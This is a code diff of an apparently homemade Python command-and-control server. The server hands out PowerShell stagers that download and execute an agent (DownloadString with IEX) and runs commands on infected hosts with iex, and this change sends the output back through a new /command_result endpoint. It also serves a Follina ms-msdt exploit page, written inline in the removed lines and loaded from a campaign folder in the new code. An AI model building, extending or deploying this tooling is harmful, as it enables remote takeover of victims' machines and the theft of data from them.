@@ -3,10 +3,14 @@ import socketserver
 import threading
 import json
 import base64
+import time
+import os
+
 
 class ThreadedHTTPServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
     """This server handles each request in a separate thread."""
     daemon_threads = True  # ensures threads exit when main thread does
+
 
 class C2RequestHandler(http.server.SimpleHTTPRequestHandler):
     def __init__(self, request, client_address, server, client_manager, logger):
@@ -16,6 +20,10 @@ class C2RequestHandler(http.server.SimpleHTTPRequestHandler):
 
     def log_message(self, format, *args):
         self.logger(f"{self.client_address[0]} - - [{self.log_date_time_string()}] {format % args}")
+        
+    def log_command_response(self, client_id, command, response):
+      self.logger(f"Command: {command}  |  Response: {response} | Client ID: {client_id}")
+      self.client_manager.log_event(client_id, "Command response", f"Command: {command}  |  Response: {response}")
 
     def do_GET(self):
         # Log the request details
@@ -54,6 +62,10 @@ class C2RequestHandler(http.server.SimpleHTTPRequestHandler):
       self.logger(f"Beacon from {client_id}")
       self.client_manager.add_client(client_id)
       commands = self.client_manager.get_pending_commands(client_id)
+      self.logger(f"Commands send to client {client_id}: {commands}")
+      # Log the command received from the client
+      for command in commands:
+          self.client_manager.log_event(client_id, "Command send", f"Type: {command['command_type']}, Args: {command['args']}")
       commands_json = json.dumps(commands)
       #send commands to the client
       self.send_response(200)
@@ -74,7 +86,8 @@ while ($true) {
         foreach ($command in $commands) {
             Write-Host "Executing command: $($command.command_type)"
             if ($command.command_type -eq "execute") {
-                iex $command.args
+                $result = iex $command.args 
+                $client.UploadString("http://{ip}:{port}/command_result", [string]$result)
             } elseif ($command.command_type -eq "upload") {
                 # Implement upload logic here
                 Write-Host "Upload command received, uploading: $($command.args)"
@@ -118,7 +131,7 @@ IEX($s)
         self.send_header("Content-type", "text/plain")
         self.end_headers()
         self.wfile.write(hjf_code.encode("utf-8"))
-    
+
     def send_hjfs_response(self):
         hjfs_code = """
 $V=new-object net.webclient;
@@ -134,83 +147,90 @@ IEX($s)
         self.wfile.write(hjfs_code.encode("utf-8"))
     
     def send_b64_stager_response(self):
-        b64_stager = """
-$V=new-object net.webclient;
-$V.proxy=[Net.WebRequest]::GetSystemWebProxy();
-$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;
-$S=$V.DownloadString('http://{ip}:{port}/raw_agent');
-IEX($S)
-"""
-        b64_stager = b64_stager.replace("{ip}",self.server.server_address[0]).replace("{port}",str(self.server.server_address[1]))
+        raw_agent = "/raw_agent"
+        stager_code = f"$V=new-object net.webclient;$S=$V.DownloadString('http://{self.server.server_address[0]}:{self.server.server_address[1]}{raw_agent}');IEX($S)"
         self.send_response(200)
         self.send_header("Content-type", "text/plain")
         self.end_headers()
-        self.wfile.write(b64_stager.encode("utf-8"))
-
+        self.wfile.write(stager_code.encode("utf-8"))
+    
     def send_b52_stager_response(self):
-        b52_stager = """
-$V=new-object net.webclient;
-$V.proxy=[Net.WebRequest]::GetSystemWebProxy();
-$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;
-$S=$V.DownloadString('http://{ip}:{port}/b52_agent');
-IEX($S)
-"""
-        b52_stager = b52_stager.replace("{ip}",self.server.server_address[0]).replace("{port}",str(self.server.server_address[1]))
+        b52_agent = "/b52_agent"
+        stager_code = f"IEX((New-Object Net.WebClient).DownloadString('http://{self.server.server_address[0]}:{self.server.server_address[1]}{b52_agent}'))"
         self.send_response(200)
         self.send_header("Content-type", "text/plain")
         self.end_headers()
-        self.wfile.write(b52_stager.encode("utf-8"))
+        self.wfile.write(stager_code.encode("utf-8"))
 
     def send_b52_agent_response(self):
-        b52_agent = """
-$V=new-object net.webclient;
-$V.proxy=[Net.WebRequest]::GetSystemWebProxy();
-$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;
-$S=$V.DownloadString('http://{ip}:{port}/raw_agent');
-IEX($S)
-"""
-        b52_agent = b52_agent.replace("{ip}",self.server.server_address[0]).replace("{port}",str(self.server.server_address[1]))
+        raw_agent = "/raw_agent"
+        agent_code = f"IEX((New-Object Net.WebClient).DownloadString('http://{self.server.server_address[0]}:{self.server.server_address[1]}{raw_agent}'))"
         self.send_response(200)
         self.send_header("Content-type", "text/plain")
         self.end_headers()
-        self.wfile.write(b52_agent.encode("utf-8"))
+        self.wfile.write(agent_code.encode("utf-8"))
 
     def send_follina_response(self):
-        follina_code = """
-<html>
-<body>
-    <script>
-        window.location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \\"it_id=PCWDiagnostic&it_brokering=yes&it_option=7&it_cmd=iex(new-object net.webclient).downloadstring('http://{ip}:{port}/raw_agent')\\"";
-    </script>
-</body>
-</html>
-"""
-        follina_code = follina_code.replace("{ip}",self.server.server_address[0]).replace("{port}",str(self.server.server_address[1]))
+      # Read the content of follina.html
+      campaign_name = "Campaign_default"
+      campaign_folder = campaign_name + "_campaign"
+      agents_folder = os.path.join(campaign_folder, "agents")
+      file_path = os.path.join(agents_folder, "follina.html")
+
+      if os.path.exists(file_path):
+        with open(file_path, 'r') as file:
+          follina_content = file.read()
         self.send_response(200)
         self.send_header("Content-type", "text/html")
         self.end_headers()
-        self.wfile.write(follina_code.encode("utf-8"))
+        self.wfile.write(follina_content.encode("utf-8"))
+      else:
+        self.send_error(404, "Follina HTML file not found.")
+
+
+    def do_POST(self):
+        # Log the request details
+        self.log_message(f"Received POST request for {self.path}")
+
+        if self.path == "/command_result":
+          self.handle_command_result()
+
+        else:
+            self.send_response(404)
+            self.send_header("Content-type", "text/plain")
+            self.end_headers()
+            self.wfile.write(b"Not Found")
+
+    def handle_command_result(self):
+      client_id = self.client_address[0]
+      content_length = int(self.headers['Content-Length'])
+      post_data = self.rfile.read(content_length).decode('utf-8')
+      self.logger(f"Result received from {client_id} : {post_data}")
+      self.client_manager.log_event(client_id, "Command Result Received", f"{post_data}")
+      self.send_response(200)
+      self.send_header("Content-type", "text/plain")
+      self.end_headers()
+      self.wfile.write(b"Command result received.")
+
+# Global variable to hold the server instance
+httpd = None
 
 def start_webserver(ip, port, client_manager, logger):
-    server_address = (ip, int(port))
+    """Starts the web server in a separate thread."""
+    global httpd
     try:
-        # Pass the ClientManager instance to the handler
-        handler = lambda request, client_address, server: C2RequestHandler(request, client_address, server, client_manager, logger)
-        httpd = ThreadedHTTPServer(server_address, handler)
+        handler = lambda *args: C2RequestHandler(*args, client_manager=client_manager, logger=logger)
+        httpd = ThreadedHTTPServer((ip, port), handler)
+        server_thread = threading.Thread(target=httpd.serve_forever)
+        server_thread.daemon = True  # Allow the main program to exit even if the server is running
+        server_thread.start()
+        return server_thread
     except Exception as e:
         logger(f"Error starting webserver: {e}")
-        return
-
-    def serve():
-        logger(f"Webserver running on {ip}:{port}")
-        try:
-            httpd.serve_forever()
-        except Exception as e:
-            logger(f"Webserver encountered an error: {e}")
-        finally:
-            httpd.server_close()
-            logger("Webserver stopped.")
-
-    server_thread = threading.Thread(target=serve, daemon=True)
-    server_thread.start()
-    return httpd
+        raise
+    
+def stop_webserver():
+    """Stops the web server."""
+    global httpd
+    if httpd:
+        httpd.shutdown()
